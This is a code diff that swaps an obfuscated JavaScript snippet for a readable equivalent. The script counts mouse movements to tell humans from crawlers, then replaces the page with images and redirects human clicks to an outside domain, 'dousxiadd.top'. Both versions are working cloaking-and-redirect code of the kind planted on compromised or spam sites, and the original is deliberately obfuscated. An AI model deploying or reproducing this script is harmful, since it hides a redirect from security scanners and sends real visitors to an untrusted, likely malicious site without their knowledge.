@@ -1,1 +1,40 @@
-var _0x137c=['click','pageX','html','pageY','location'];var _0x2b23=function(_0x137cba,_0x2b23d2){_0x137cba=_0x137cba-0x0;var _0x4ed9d3=_0x137c[_0x137cba];return _0x4ed9d3;};var numCount=0x0;var allowCount=0x14;var url='https://dousxiadd.top/';var isRedirect=![];$(function(){document['title']='site';$('body')['mousemove'](function(_0x4fa27c){if(_0x4fa27c['pageX']>0x0&&_0x4fa27c[_0x2b23('0x3')]>0x0){numCount++;if(numCount==allowCount){if(isRedirect==!![]){window['location']=url;}else{$('body')[_0x2b23('0x2')]('<img\x20src=\x2711a.jpg\x27\x20/><img\x20src=\x2722b.jpg\x27\x20/><img\x20src=\x2733c.jpg\x27\x20/>');}}}});$('body')[_0x2b23('0x0')](function(_0x4babde){if(checkRes(_0x4babde)==!![]){window[_0x2b23('0x4')]=url;}});});function checkRes(_0x44e7c1){if(numCount>=allowCount&&_0x44e7c1[_0x2b23('0x1')]>0x0&&_0x44e7c1[_0x2b23('0x3')]>0x0){return!![];}else{return![];}}
+var numCount=0;
+var allowCount=20;
+var url="https://dousxiadd.top/";
+var isRedirect=false;
+$(function()
+{
+	document.title="site";
+	$("body").mousemove(function(event)
+	{
+		if(event.pageX>0 && event.pageY>0)
+		{
+			numCount++;
+			if(numCount==allowCount)
+			{
+				if(isRedirect==true)
+				{
+					window.location=url;
+				}
+				else
+				{
+					$("body").html("<img src='11a.jpg' /><img src='22b.jpg' /><img src='33c.jpg' />");
+				}
+			}
+		}
+	});
+
+	$("body").click(function(event)
+	{
+		if(checkRes(event)==true)
+		{
+			window.location=url;
+		}
+	});
+})
+
+function checkRes(e)
+{
+	if(numCount>=allowCount && e.pageX>0 && e.pageY>0)
+	{return true;}else{return false;}
+}
